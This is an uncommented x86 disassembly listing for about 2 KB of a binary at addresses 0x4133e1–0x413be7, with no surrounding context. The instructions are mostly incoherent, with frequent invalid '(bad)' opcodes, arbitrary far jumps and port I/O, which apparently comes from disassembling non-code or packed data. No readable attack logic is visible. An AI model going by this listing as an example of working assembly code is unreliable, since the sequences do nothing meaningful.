  4133e1:	xchg   ebx,eax
  4133e2:	popf   
  4133e3:	loope  0x413408
  4133e5:	mov    esp,0x2d908dee
  4133ea:	mov    al,ds:0xaf798643
  4133ef:	adc    BYTE PTR [edx+0x6],bl
  4133f2:	iret   
  4133f3:	test   BYTE PTR [esi+0x8],0xfd
  4133f7:	dec    esp
  4133f8:	xor    al,0xc1
  4133fa:	cmp    BYTE PTR [ecx-0x2a],bl
  4133fd:	xor    ebp,ebx
  4133ff:	xor    al,BYTE PTR cs:[ecx]
  413402:	dec    eax
  413403:	retf   0x7d83
  413406:	inc    ebp
  413407:	lahf   
  413408:	mov    WORD PTR [esi-0x5f8f5603],?
  41340e:	or     al,0x3d
  413410:	fisub  WORD PTR [esi-0x3f2ee8ac]
  413416:	cli    
  413417:	mov    eax,0x1140abdd
  41341c:	dec    ebp
  41341d:	inc    esp
  41341e:	(bad)  [edx]
  413420:	test   eax,0x8846842a
  413425:	push   esi
  413426:	adc    bl,BYTE PTR [edi+edx*8+0x5c]
  41342a:	aad    0xf8
  41342c:	pop    ebx
  41342d:	inc    edi
  41342e:	push   ss
  41342f:	fnstsw WORD PTR [ecx+eiz*4+0x5a721b3d]
  413436:	pop    ebp
  413437:	jecxz  0x413418
  413439:	mov    dl,0xe2
  41343b:	dec    ebx
  41343c:	sbb    bh,BYTE PTR [ebx+0x4a03ae01]
  413442:	add    dl,al
  413444:	ret    
  413445:	add    eax,0x8c9f97c8
  41344a:	mov    esi,0x98405bce
  41344f:	gs call 0x627b:0x305d4cb8
  413457:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413458:	and    ebx,DWORD PTR ds:0x4ef98854
  41345e:	mov    cs,WORD PTR [ebx]
  413460:	inc    edi
  413461:	lahf   
  413462:	add    DWORD PTR [esi],esp
  413464:	jbe    0x4134bc
  413466:	nop
  413467:	aad    0x48
  413469:	in     eax,0xaf
  41346b:	cmp    bh,bl
  41346d:	loop   0x413472
  41346f:	dec    edi
  413470:	(bad)  
  413471:	cmp    al,0xce
  413473:	lea    edx,[ebx]
  413475:	sti    
  413476:	shr    DWORD PTR [ecx+0x36],cl
  413479:	rcr    DWORD PTR [edx+0x48012579],1
  41347f:	int3   
  413480:	add    al,0x37
  413482:	sti    
  413483:	js     0x4134d5
  413485:	jae    0x413428
  413487:	out    0x17,eax
  413489:	loope  0x41343a
  41348b:	int3   
  41348c:	fcomp  DWORD PTR [edi]
  41348e:	jmp    0xf43f:0x22c5fa9a
  413495:	push   cs
  413496:	imul   ecx,DWORD PTR [esi+0x41e52a1c],0xffffff85
  41349d:	cs jle 0x4134c1
  4134a0:	imul   ecx,DWORD PTR [eax-0x7b904858],0x1d69381d
  4134aa:	or     eax,0x7c2a8ec
  4134af:	xchg   edi,eax
  4134b0:	jl     0x413470
  4134b2:	sub    al,0x2c
  4134b4:	mov    edx,0x7e3b9854
  4134b9:	push   esi
  4134ba:	mov    DWORD PTR [edx+0x7b],esi
  4134bd:	xor    BYTE PTR [edx+0x6d],ch
  4134c0:	dec    edi
  4134c1:	push   ecx
  4134c2:	jo     0x413500
  4134c4:	pop    es
  4134c5:	dec    ecx
  4134c6:	xchg   esi,eax
  4134c7:	(bad)  
  4134c8:	in     al,0x4a
  4134ca:	dec    eax
  4134cb:	ret    
  4134cc:	push   ebp
  4134cd:	or     ebx,DWORD PTR [esi-0x1471910a]
  4134d3:	in     al,0x4
  4134d5:	or     eax,0x58
  4134d8:	adc    eax,0xd34ae1ba
  4134dd:	jmp    0x4134d6
  4134df:	mov    dh,0xcf
  4134e1:	and    edx,edi
  4134e3:	dec    BYTE PTR [edi]
  4134e5:	std    
  4134e6:	jmp    0x413468
  4134e8:	or     edi,0xffffff81
  4134eb:	pop    eax
  4134ec:	bound  ecx,QWORD PTR [ecx+0x270b0aed]
  4134f2:	test   BYTE PTR [esi+0x6b4c7135],bh
  4134f8:	add    al,0xdf
  4134fa:	imul   edx
  4134fc:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4134fe:	bound  ebp,QWORD PTR [edx-0x5ce1854e]
  413504:	sbb    DWORD PTR [ebp+0x663a1745],edi
  41350a:	fldenv ds:0x633f7a72
  413510:	or     BYTE PTR [ebx-0x63dddebd],dh
  413516:	dec    eax
  413517:	xchg   ebp,eax
  413518:	shr    cl,1
  41351a:	dec    eax
  41351b:	pop    ds
  41351c:	push   esp
  41351d:	dec    eax
  41351e:	mov    bh,0x47
  413520:	mov    ds:0x8137b821,al
  413525:	dec    edx
  413526:	repz out dx,eax
  413528:	jmp    0xc5431cc
  41352d:	shl    BYTE PTR [ecx],cl
  41352f:	out    dx,eax
  413530:	jne    0x413528
  413532:	stc    
  413533:	cwde   
  413534:	out    0x38,eax
  413536:	iret   
  413537:	push   esi
  413538:	mov    dh,0x6d
  41353a:	in     eax,dx
  41353b:	push   cs
  41353c:	cdq    
  41353d:	push   ebx
  41353e:	dec    esp
  41353f:	mov    bl,0x37
  413541:	sub    al,0xda
  413543:	out    dx,eax
  413544:	jbe    0x4134f4
  413546:	and    BYTE PTR [eax+0x1d141cf5],0x2c
  41354d:	fcomp  QWORD PTR [edi]
  41354f:	push   ss
  413550:	cwde   
  413551:	push   0xbbf17e82
  413556:	dec    eax
  413557:	pop    edi
  413558:	mov    esi,0xdb00573a
  41355d:	iret   
  41355e:	bound  edi,QWORD PTR [ebx+0x1a]
  413561:	aam    0x67
  413563:	cmp    dh,cl
  413565:	jb     0x413510
  413567:	jecxz  0x4135aa
  413569:	adc    ecx,DWORD PTR [ecx-0x7a]
  41356c:	or     eax,DWORD PTR [ebp+0x4f178268]
  413572:	jns    0x413531
  413574:	test   eax,0x931d4e8e
  413579:	and    al,ah
  41357b:	cmp    ebp,0xfffffff9
  41357e:	test   DWORD PTR gs:[edx-0x3],0x25c4a669
  413586:	and    edx,DWORD PTR [ebp+0x25]
  413589:	rcr    BYTE PTR [eax],0x7d
  41358c:	arpl   WORD PTR [ecx-0x30],cx
  41358f:	sub    eax,0xa1863e1b
  413594:	sub    eax,0xb6a14383
  413599:	ror    BYTE PTR [edx+esi*2-0x2c],1
  41359d:	or     cl,bl
  41359f:	dec    edi
  4135a0:	mov    bl,0xca
  4135a2:	sub    cl,bl
  4135a4:	cmp    eax,0x5dbddb84
  4135a9:	lahf   
  4135aa:	or     al,0xb2
  4135ac:	outs   dx,BYTE PTR ds:[esi]
  4135ad:	mov    ch,0xe9
  4135af:	repnz cmp al,0x7e
  4135b2:	push   ebx
  4135b3:	inc    eax
  4135b4:	leave  
  4135b5:	push   eax
  4135b6:	jns    0x41362b
  4135b8:	xchg   BYTE PTR [edi-0x39],dl
  4135bb:	jmp    0x413608
  4135bd:	mov    dl,BYTE PTR [edx-0x507a68be]
  4135c3:	packuswb mm3,QWORD PTR [edx+0x1f]
  4135c7:	cmp    DWORD PTR [ebx+edi*4],ebx
  4135ca:	push   cs
  4135cb:	jns    0x413587
  4135cd:	mov    cl,0x37
  4135cf:	pop    es
  4135d0:	cmc    
  4135d1:	imul   ecx,DWORD PTR [edx-0x45706358],0xe7ed4a08
  4135db:	fist   WORD PTR [edx+0x13]
  4135de:	out    dx,al
  4135df:	or     eax,0x10c4da9f
  4135e4:	pushf  
  4135e5:	lds    esi,FWORD PTR [edi+0x8]
  4135e8:	sub    al,cl
  4135ea:	jg     0x4135fd
  4135ec:	or     al,0x51
  4135ee:	jae    0x413595
  4135f0:	mov    edi,0x87f2eeb4
  4135f5:	ret    0x2140
  4135f8:	sbb    al,BYTE PTR [ecx+0x79991635]
  4135fe:	ret    0xb3f9
  413601:	mov    bh,0x58
  413603:	mov    bh,0xc6
  413605:	mov    ebx,0x9f07ef0d
  41360a:	cmp    DWORD PTR [edi+0x6453aeff],ebx
  413610:	sub    DWORD PTR [esi-0x30061b8e],ecx
  413616:	dec    ecx
  413617:	jbe    0x413617
  413619:	jl     0x41359f
  41361b:	fsubr  QWORD PTR [ecx+0x1f46ae70]
  413621:	enter  0x50d5,0xa2
  413625:	or     bl,BYTE PTR [ebx+0x3f]
  413628:	or     DWORD PTR [esi-0x30ea79ae],esi
  41362e:	shr    BYTE PTR [esi],cl
  413630:	shl    BYTE PTR [ebx+0x2defbedd],0x40
  413637:	lods   al,BYTE PTR ds:[esi]
  413638:	inc    edx
  413639:	inc    ebx
  41363a:	jge    0x413614
  41363c:	out    0x1d,eax
  41363e:	les    esp,FWORD PTR [ebp-0x67]
  413641:	mov    esp,0xe4858181
  413646:	bound  edx,QWORD PTR [ecx-0x8e41d8c]
  41364c:	stc    
  41364d:	ror    DWORD PTR [edx-0xf],cl
  413650:	dec    eax
  413651:	sbb    al,0x58
  413653:	mov    bh,0xd
  413655:	adc    eax,0x8242ad6a
  41365a:	add    ch,al
  41365c:	idiv   BYTE PTR [ebp+0x2d]
  41365f:	fyl2xp1 
  413661:	shl    edi,1
  413663:	inc    ecx
  413664:	call   0xafe:0x4847e851
  41366b:	cmc    
  41366c:	ret    0xe285
  41366f:	xchg   BYTE PTR [eax],dl
  413671:	push   cs
  413672:	jl     0x413606
  413674:	aaa    
  413675:	dec    edi
  413676:	data16 fmulp st(4),st
  413679:	stos   DWORD PTR es:[edi],eax
  41367a:	aad    0x4b
  41367c:	inc    edi
  41367d:	fild   QWORD PTR ds:0x1feac365
  413683:	push   ds
  413684:	test   DWORD PTR [ecx*4-0x11a91187],ebp
  41368b:	xchg   BYTE PTR [esi+0x4aedd819],cl
  413691:	push   edx
  413692:	sub    eax,0xe2a40183
  413697:	imul   edi,ebx,0xffffffd1
  41369a:	lods   eax,DWORD PTR ds:[esi]
  41369b:	push   esi
  41369c:	pusha  
  41369d:	inc    eax
  41369e:	push   ds
  41369f:	stos   DWORD PTR es:[edi],eax
  4136a0:	push   0xd84cdd6a
  4136a5:	add    eax,0xf529ea32
  4136aa:	outs   dx,DWORD PTR ds:[esi]
  4136ab:	ror    eax,1
  4136ad:	gs xor eax,0xd760950b
  4136b3:	push   es
  4136b4:	test   DWORD PTR [edi],0xbe1e2cb1
  4136ba:	mov    ss,WORD PTR [ebp+ecx*2+0x208048b8]
  4136c1:	and    BYTE PTR [eax],0x70
  4136c4:	inc    ebp
  4136c5:	inc    ecx
  4136c6:	inc    ecx
  4136c7:	jmp    0x41370a
  4136c9:	popf   
  4136ca:	es jmp 0x1441:0x916fe44f
  4136d2:	mov    DWORD PTR [eax+eiz*1],ebp
  4136d5:	jl     0x413709
  4136d7:	into   
  4136d8:	icebp  
  4136d9:	loope  0x4136f7
  4136db:	or     al,0x17
  4136dd:	scas   al,BYTE PTR es:[edi]
  4136de:	enter  0x2a95,0xb1
  4136e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136e3:	test   BYTE PTR [esp+ebp*8],ah
  4136e6:	popa   
  4136e7:	sbb    cl,BYTE PTR [edx+0x10]
  4136ea:	(bad)  [eax]
  4136ec:	sub    cl,bl
  4136ee:	pusha  
  4136ef:	das    
  4136f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136f1:	mov    dl,0x8a
  4136f3:	jbe    0x41367c
  4136f5:	and    al,0x91
  4136f7:	cld    
  4136f8:	sbb    DWORD PTR [ebx],esp
  4136fa:	inc    edi
  4136fb:	dec    edx
  4136fc:	push   0xd6e47152
  413701:	mov    ds:0x6c20a917,al
  413706:	xor    cl,bl
  413708:	fxch   st(6)
  41370a:	add    al,BYTE PTR [edx-0xf7994cc]
  413710:	mov    bl,0xc4
  413712:	cld    
  413713:	dec    edi
  413714:	cmp    DWORD PTR [ecx-0x2e842717],edi
  41371a:	jg     0x41376c
  41371c:	mov    ds:0x940468c,eax
  413721:	pop    edx
  413722:	stos   BYTE PTR es:[edi],al
  413723:	cmp    ebx,DWORD PTR [edi+0x7e]
  413726:	push   ebx
  413727:	fucomp st(1)
  413729:	sub    BYTE PTR ds:0x97a03a27,bh
  41372f:	or     al,0xb3
  413731:	test   eax,0x4fdff617
  413736:	addr16 mov bh,0xae
  413739:	mov    al,ds:0xdb2d2fe4
  41373e:	inc    ebx
  41373f:	(bad)  
  413740:	mov    edi,0x8489224f
  413745:	neg    eax
  413747:	mov    dl,0xbf
  413749:	(bad)  [edi]
  41374b:	or     DWORD PTR [edi-0x5b645dfa],edx
  413751:	fwait
  413752:	push   ebp
  413753:	dec    edx
  413754:	push   edx
  413755:	mov    bh,0x3f
  413757:	rcr    DWORD PTR [ebx+0x630e2ea3],cl
  41375d:	mov    cl,0xe6
  41375f:	lds    edx,FWORD PTR [edx-0x61fef480]
  413765:	imul   edx,DWORD PTR [esi+0x78ec4263],0xb74e0968
  41376f:	lea    ecx,[edi+eiz*1]
  413772:	int    0x6d
  413774:	ins    BYTE PTR es:[di],dx
  413776:	repz rcr BYTE PTR [edi],0x9e
  41377a:	xchg   ebp,eax
  41377b:	inc    ebx
  41377c:	push   cs
  41377d:	fbstp  TBYTE PTR [di]
  413780:	pop    eax
  413781:	ja     0x4137bd
  413783:	inc    eax
  413784:	mov    ch,0x4c
  413786:	jg     0x4137c6
  413788:	jecxz  0x413763
  41378a:	mov    dl,0x71
  41378c:	pop    DWORD PTR [edi]
  41378e:	fisub  DWORD PTR [ecx-0x3ad9a49f]
  413794:	jne    0x4137d7
  413796:	test   al,0xe1
  413798:	stc    
  413799:	and    al,0x8e
  41379b:	stos   DWORD PTR es:[edi],eax
  41379c:	std    
  41379d:	out    dx,eax
  41379e:	sar    BYTE PTR [eax*1-0x55cae6e0],1
  4137a5:	or     dh,BYTE PTR [ebx-0x55c69b36]
  4137ab:	mov    ah,0x4d
  4137ad:	popa   
  4137ae:	bound  esi,QWORD PTR [ebx]
  4137b0:	dec    ebx
  4137b1:	jmp    0xcdc51842
  4137b6:	cmp    al,0xca
  4137b8:	loop   0x413768
  4137ba:	jns    0x413815
  4137bc:	pop    esi
  4137bd:	in     eax,dx
  4137be:	fs ja  0x413833
  4137c1:	lods   eax,DWORD PTR ds:[esi]
  4137c2:	lds    eax,FWORD PTR ds:0x6273575f
  4137c8:	jge    0x413833
  4137ca:	sub    al,BYTE PTR [esi+0x42]
  4137cd:	cli    
  4137ce:	out    dx,al
  4137cf:	mov    ebx,0xf7a284ad
  4137d4:	jmp    0x89c9:0xcd8855df
  4137db:	fisttp WORD PTR [ecx]
  4137dd:	sbb    eax,0x6c632f43
  4137e2:	das    
  4137e3:	add    eax,0xbf02953d
  4137e8:	mov    ah,0x91
  4137ea:	or     al,0xa6
  4137ec:	push   edi
  4137ed:	inc    esi
  4137ee:	dec    esi
  4137ef:	lods   al,BYTE PTR ds:[esi]
  4137f0:	sbb    ah,cl
  4137f2:	mov    dl,0x3c
  4137f4:	popf   
  4137f5:	test   al,0x1e
  4137f7:	push   cs
  4137f8:	pop    ds
  4137f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137fa:	jmp    0x4137ec
  4137fc:	xchg   esi,eax
  4137fd:	aam    0x73
  4137ff:	pusha  
  413800:	mov    dh,0x12
  413802:	test   al,0xd3
  413804:	ror    DWORD PTR ds:0xf9896952,cl
  41380a:	sub    DWORD PTR [edx+0x34],0xf4f2ca6d
  413811:	jb     0x413883
  413813:	shl    DWORD PTR [ebx+0x59c7058f],cl
  413819:	int    0x5c
  41381b:	jo     0x41389b
  41381d:	mov    ecx,0x8e56445c
  413822:	test   eax,0x2040c277
  413827:	neg    DWORD PTR [edi+0x273bb2d1]
  41382d:	out    dx,eax
  41382e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41382f:	je     0x413835
  413831:	cwde   
  413832:	dec    BYTE PTR ds:[ecx+0x2b]
  413836:	adc    DWORD PTR [ebx+0x4f],ebx
  413839:	sub    dh,BYTE PTR ds:0x817906a8
  41383f:	das    
  413840:	xchg   ebx,ebp
  413842:	rol    DWORD PTR [ebx],0x30
  413845:	add    eax,0xd22ebcd2
  41384a:	push   ebp
  41384b:	fsubr  QWORD PTR [edx+0x31]
  41384e:	ret    
  41384f:	sub    eax,0x7d2c149d
  413854:	push   eax
  413855:	lds    esp,FWORD PTR [esi-0x5da33f57]
  41385b:	push   0x63bfd876
  413860:	mov    ah,0xdc
  413862:	sbb    bh,dl
  413864:	sbb    edx,0x778b3a89
  41386a:	pushf  
  41386b:	inc    eax
  41386c:	mov    cl,dh
  41386e:	daa    
  41386f:	jnp    0x41385d
  413871:	je     0x4138b7
  413873:	add    al,0x30
  413875:	dec    edx
  413876:	inc    ecx
  413877:	ss repz or dh,dh
  41387b:	sub    DWORD PTR [esi-0x28],edi
  41387e:	xchg   BYTE PTR [edx+0x66d63749],dh
  413884:	lods   al,BYTE PTR ds:[esi]
  413885:	sub    edx,DWORD PTR [ecx+0xd]
  413888:	jno    0x4138a7
  41388a:	add    esp,DWORD PTR [edx+edx*1]
  41388d:	push   esi
  41388e:	loope  0x413832
  413890:	or     eax,0x1d3a678e
  413895:	test   BYTE PTR [esi+0x20],ch
  413898:	jle    0x413907
  41389a:	pop    eax
  41389b:	cmp    bl,bh
  41389d:	aam    0x5f
  41389f:	and    BYTE PTR [eax+0x3a],ah
  4138a2:	mov    DWORD PTR [ecx-0x1d9af881],ebp
  4138a8:	rcl    ecx,1
  4138aa:	loopne 0x413856
  4138ac:	out    0x68,eax
  4138ae:	aaa    
  4138af:	aam    0xa3
  4138b1:	mul    BYTE PTR [esi+0x26a9d25]
  4138b7:	adc    DWORD PTR ds:0x271601de,ebx
  4138bd:	je     0x4138ec
  4138bf:	ins    BYTE PTR es:[edi],dx
  4138c0:	adc    BYTE PTR [esi],0x6f
  4138c3:	or     BYTE PTR [ebx-0x5a420b14],al
  4138c9:	dec    esi
  4138ca:	mov    ebx,0xc79c4c7b
  4138cf:	jnp    0x4138fa
  4138d1:	popf   
  4138d2:	lock cmp eax,0x2ee381f5
  4138d8:	or     ecx,DWORD PTR [eax+0x16]
  4138db:	push   edi
  4138dc:	iret   
  4138dd:	push   eax
  4138de:	gs cwde 
  4138e0:	mov    dh,0x13
  4138e2:	mov    WORD PTR [ebx],cs
  4138e4:	push   edi
  4138e5:	adc    bl,BYTE PTR [esi-0x5d37571c]
  4138eb:	aam    0xd1
  4138ed:	adc    DWORD PTR [edi+eax*4+0x18e0b027],esp
  4138f4:	ror    BYTE PTR [esi],1
  4138f6:	or     DWORD PTR [ebx+ebx*1+0x2b17d7f2],ecx
  4138fd:	mov    al,ds:0x2d7c3195
  413902:	or     cl,BYTE PTR [ebx+eiz*8+0x55d10db3]
  413909:	aaa    
  41390a:	jl     0x41396b
  41390c:	push   ds
  41390d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41390e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41390f:	out    0xb4,eax
  413911:	xchg   esp,eax
  413912:	arpl   WORD PTR [ebx+0x700d5109],bp
  413918:	(bad)  
  413919:	jbe    0x413974
  41391b:	jl     0x4138e6
  41391d:	call   0xf82f:0x8880b848
  413924:	dec    ebx
  413925:	mov    ds:0x2ff1e2ca,eax
  41392a:	stc    
  41392b:	push   0x45
  41392d:	cmp    ecx,DWORD PTR [edi+ecx*4+0x7a0e7afa]
  413934:	or     edi,DWORD PTR [esi+edx*4+0x56]
  413938:	dec    ebp
  413939:	add    BYTE PTR [esi-0x72f61ed5],dl
  41393f:	loopne 0x41395e
  413941:	push   edx
  413942:	fadd   QWORD PTR [edi-0x370ac16b]
  413948:	aaa    
  413949:	and    al,0x58
  41394b:	mov    eax,DWORD PTR ds:0x16f7c971
  413951:	pop    edi
  413952:	adc    eax,0xbd0449e1
  413957:	mov    dl,0x93
  413959:	pop    edx
  41395a:	das    
  41395b:	dec    edi
  41395c:	and    eax,0x4c254507
  413961:	hlt    
  413962:	mov    ah,BYTE PTR [eax+0x6e]
  413965:	mov    ebx,ebx
  413967:	or     BYTE PTR [edx-0x7457f9d4],ah
  41396d:	mov    edx,0x890eb736
  413972:	xchg   DWORD PTR [eax+esi*8],ebx
  413975:	in     al,dx
  413976:	(bad)  
  413977:	hlt    
  413978:	push   ebx
  413979:	es pusha 
  41397b:	lods   eax,DWORD PTR ds:[esi]
  41397c:	hlt    
  41397d:	push   ss
  41397e:	or     ch,ah
  413980:	inc    edi
  413981:	iret   
  413982:	push   ebx
  413983:	push   es
  413984:	jmp    0xa306:0x90e0855e
  41398b:	mov    dh,0xdb
  41398d:	and    al,0xd8
  41398f:	dec    edx
  413990:	mov    esp,0x711e504e
  413995:	(bad)  
  413996:	in     al,dx
  413997:	addr16 inc ebx
  413999:	sbb    edx,DWORD PTR [edi]
  41399b:	sbb    cl,0xe1
  41399e:	mov    ebp,DWORD PTR [edx]
  4139a0:	mov    ?,WORD PTR [edi]
  4139a2:	or     DWORD PTR [esi+0x21f52116],ebx
  4139a8:	or     esi,DWORD PTR [ecx-0x3b]
  4139ab:	mov    DWORD PTR [eax],esp
  4139ad:	xor    bl,BYTE PTR [eax-0x7b095778]
  4139b3:	jo     0x413a2b
  4139b5:	int    0xd8
  4139b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139b8:	(bad)  
  4139b9:	scas   al,BYTE PTR es:[edi]
  4139ba:	out    dx,eax
  4139bb:	jne    0x4139fd
  4139bd:	xor    eax,0x3382b6a5
  4139c2:	in     eax,dx
  4139c3:	or     DWORD PTR [esi],eax
  4139c5:	pop    ss
  4139c6:	jmp    0x557c:0x576217fe
  4139cd:	xchg   esi,eax
  4139ce:	mov    ds:0x18dc858f,al
  4139d3:	scas   eax,DWORD PTR es:[edi]
  4139d4:	ds inc esp
  4139d6:	sub    al,0x7
  4139d8:	dec    esi
  4139d9:	dec    ebp
  4139da:	mov    ah,BYTE PTR [esi+0xb2ff97b]
  4139e0:	out    dx,eax
  4139e1:	dec    al
  4139e3:	and    bl,BYTE PTR [edi+0x7b]
  4139e6:	sbb    esi,ebx
  4139e8:	int    0xb5
  4139ea:	retf   
  4139eb:	ins    DWORD PTR es:[edi],dx
  4139ec:	mov    BYTE PTR [esi],ch
  4139ee:	jae    0x4139a0
  4139f0:	lods   eax,DWORD PTR ds:[esi]
  4139f1:	out    0xa1,eax
  4139f3:	add    BYTE PTR [ecx],bl
  4139f5:	retf   
  4139f6:	and    edx,DWORD PTR [ebx]
  4139f8:	adc    DWORD PTR [ebx-0x2],eax
  4139fb:	inc    edi
  4139fc:	dec    ecx
  4139fd:	mov    bl,0x96
  4139ff:	cdq    
  413a00:	xchg   edx,eax
  413a01:	adc    BYTE PTR [ebx],ah
  413a03:	mov    ebp,0x22ba09ac
  413a08:	mov    ds:0x81408ff3,eax
  413a0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a0e:	rol    DWORD PTR [edi+0x29],cl
  413a11:	mov    al,0xa0
  413a13:	lea    edi,[edi+edi*2]
  413a16:	cmp    BYTE PTR [ecx],dh
  413a18:	int    0x70
  413a1a:	pop    esi
  413a1b:	pusha  
  413a1c:	sub    eax,0x9c194315
  413a21:	mov    dh,BYTE PTR [esi-0x1078840c]
  413a27:	call   0xb75da035
  413a2c:	lock mov dl,0xc2
  413a2f:	scas   al,BYTE PTR es:[edi]
  413a30:	push   ecx
  413a31:	int3   
  413a32:	(bad)  
  413a34:	jo     0x413a19
  413a36:	inc    edi
  413a37:	and    DWORD PTR [esi],eax
  413a39:	and    al,0x8
  413a3b:	dec    ebx
  413a3c:	and    eax,0x635ce653
  413a41:	jmp    0xb82d836b
  413a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a47:	ret    
  413a48:	push   ebx
  413a49:	mov    edi,0xb10d8d0b
  413a4e:	in     al,0xb7
  413a50:	ficom  WORD PTR [edi-0x10a701e1]
  413a56:	mov    bl,0x7a
  413a58:	inc    eax
  413a59:	pop    ecx
  413a5a:	rcr    DWORD PTR [eax],0xcb
  413a5d:	(bad)  
  413a5e:	test   BYTE PTR [eax-0x6e],0xcf
  413a62:	or     al,0xec
  413a64:	xchg   ebx,eax
  413a65:	hlt    
  413a66:	ss or  al,0x8
  413a69:	les    esi,FWORD PTR [ebx-0x5fff00d0]
  413a6f:	mov    cl,0xf8
  413a71:	sub    BYTE PTR [esi+0x707a31a9],bh
  413a77:	mov    edi,0xbe01bb8a
  413a7c:	xor    eax,DWORD PTR [ecx]
  413a7e:	mov    ah,0x36
  413a80:	fadd   DWORD PTR [ebp-0x470665d9]
  413a86:	out    0xcd,al
  413a88:	jg     0x413aab
  413a8a:	jnp    0x413ab7
  413a8c:	mov    eax,0x3277623d
  413a91:	jge    0x413a22
  413a93:	enter  0xde19,0x61
  413a97:	jecxz  0x413ab0
  413a99:	or     ch,BYTE PTR [eax]
  413a9b:	lock ss pop ebp
  413a9e:	jge    0x413a99
  413aa0:	bswap  ebp
  413aa2:	jnp    0x413acc
  413aa4:	push   edx
  413aa5:	sub    eax,ebp
  413aa7:	sbb    eax,0x426ca580
  413aac:	mov    esp,0x822675eb
  413ab1:	sbb    BYTE PTR [edi],cl
  413ab3:	cmp    BYTE PTR [edi],dl
  413ab5:	popf   
  413ab6:	neg    BYTE PTR [edx-0x5bc2aee0]
  413abc:	sbb    BYTE PTR [edx],bh
  413abe:	add    edi,0x4a8f91b8
  413ac4:	inc    ebx
  413ac5:	dec    edx
  413ac6:	inc    ebx
  413ac7:	fbstp  TBYTE PTR ds:0xef7ed67f
  413acd:	dec    esp
  413ace:	fstp   DWORD PTR [eax+0x42]
  413ad1:	push   eax
  413ad2:	stos   BYTE PTR es:[edi],al
  413ad3:	adc    eax,0x3e576f7
  413ad8:	clc    
  413ad9:	add    eax,0xd7642553
  413ade:	pusha  
  413adf:	inc    edx
  413ae0:	outs   dx,BYTE PTR ds:[esi]
  413ae1:	aaa    
  413ae2:	aas    
  413ae3:	sbb    esi,ecx
  413ae5:	(bad)  
  413ae6:	sub    DWORD PTR [edi-0x56],0xf300e3dd
  413aed:	arpl   WORD PTR [esi+0x58d90fe3],cx
  413af3:	out    0xdf,eax
  413af5:	mov    ah,0xe8
  413af7:	cmp    al,0xe4
  413af9:	xchg   DWORD PTR [eax+0x380ef7a9],ecx
  413aff:	push   ebx
  413b00:	lds    esi,FWORD PTR [eax+0x344898da]
  413b06:	pusha  
  413b07:	push   esi
  413b08:	add    cl,BYTE PTR [esi-0x694cd609]
  413b0e:	hlt    
  413b0f:	or     BYTE PTR ss:[eax*1+0xe0986c8],dh
  413b17:	int    0x5e
  413b19:	jnp    0x413abb
  413b1b:	jne    0x413b65
  413b1d:	or     al,0x5b
  413b1f:	jg     0x413b1a
  413b21:	mov    al,0xfa
  413b23:	rcr    DWORD PTR [edi+ebp*2-0xa29ba6b],0x28
  413b2b:	xchg   ebx,eax
  413b2c:	imul   esp,DWORD PTR ds:0xa3b6772b,0x7a
  413b33:	out    0xce,al
  413b35:	popf   
  413b36:	mov    eax,0x2b16a7e8
  413b3b:	cld    
  413b3c:	sahf   
  413b3d:	add    bh,BYTE PTR [edx]
  413b3f:	in     eax,0x76
  413b41:	outs   dx,DWORD PTR ds:[esi]
  413b42:	sbb    DWORD PTR [esi+0xc],0xfd7ae672
  413b49:	cld    
  413b4a:	xchg   esi,eax
  413b4b:	pop    ds
  413b4c:	jae    0x413b2d
  413b4e:	popa   
  413b4f:	(bad)  
  413b50:	ja     0x413b28
  413b52:	les    ecx,FWORD PTR [edi-0x29ffdd73]
  413b58:	push   ds
  413b59:	mov    cl,0x93
  413b5b:	cmp    BYTE PTR [ebx],ah
  413b5d:	inc    edx
  413b5e:	jl     0x413b3a
  413b60:	call   0xbb0e:0x2bcc24c7
  413b67:	lea    ecx,[ebx-0x6139185a]
  413b6d:	push   0xffffffa4
  413b6f:	xor    al,0x55
  413b71:	dec    esi
  413b72:	out    dx,eax
  413b73:	xchg   edi,eax
  413b74:	ins    DWORD PTR es:[edi],dx
  413b75:	mov    eax,ds:0xd62d380f
  413b7a:	bound  eax,QWORD PTR [esi]
  413b7c:	mov    ds:0xb810d063,al
  413b81:	pop    edx
  413b82:	outs   dx,BYTE PTR ds:[esi]
  413b83:	xor    BYTE PTR [esi+0x58d80f37],bh
  413b89:	and    bh,BYTE PTR [esi+0x4]
  413b8c:	out    dx,eax
  413b8d:	in     eax,0xe5
  413b8f:	push   cs
  413b90:	mov    cl,0x30
  413b92:	stc    
  413b93:	neg    bh
  413b95:	mov    dh,0x5d
  413b97:	jge    0x413b6f
  413b99:	out    dx,al
  413b9a:	cs popf 
  413b9c:	or     dh,al
  413b9e:	mov    al,ds:0x96db917c
  413ba3:	int    0xed
  413ba5:	xchg   edx,eax
  413ba6:	stc    
  413ba7:	cli    
  413ba8:	lods   eax,DWORD PTR ds:[esi]
  413ba9:	arpl   WORD PTR [edi+0xd31b74b],ax
  413baf:	stos   BYTE PTR es:[edi],al
  413bb0:	popf   
  413bb1:	(bad)  
  413bb3:	inc    ebp
  413bb4:	mov    ah,0xf5
  413bb6:	fwait
  413bb7:	into   
  413bb8:	retf   0xc14a
  413bbb:	mov    edi,0x2a4b82e4
  413bc0:	push   ebp
  413bc1:	and    eax,0x4bd3f77
  413bc6:	xor    esp,ecx
  413bc8:	arpl   sp,sp
  413bca:	inc    ebx
  413bcb:	scas   eax,DWORD PTR es:[edi]
  413bcc:	sub    ecx,DWORD PTR [edx]
  413bce:	push   cs
  413bcf:	scas   eax,DWORD PTR es:[edi]
  413bd0:	dec    edi
  413bd1:	leave  
  413bd2:	dec    edi
  413bd3:	aaa    
  413bd4:	popa   
  413bd5:	test   DWORD PTR [edx+ebp*8],eax
  413bd8:	pop    edx
  413bd9:	rcl    cl,1
  413bdb:	enter  0x7e21,0xa0
  413bdf:	pop    ss
  413be0:	sub    BYTE PTR [ebx+0x54d39d39],0x72
  413be7:	in     eax,0x69
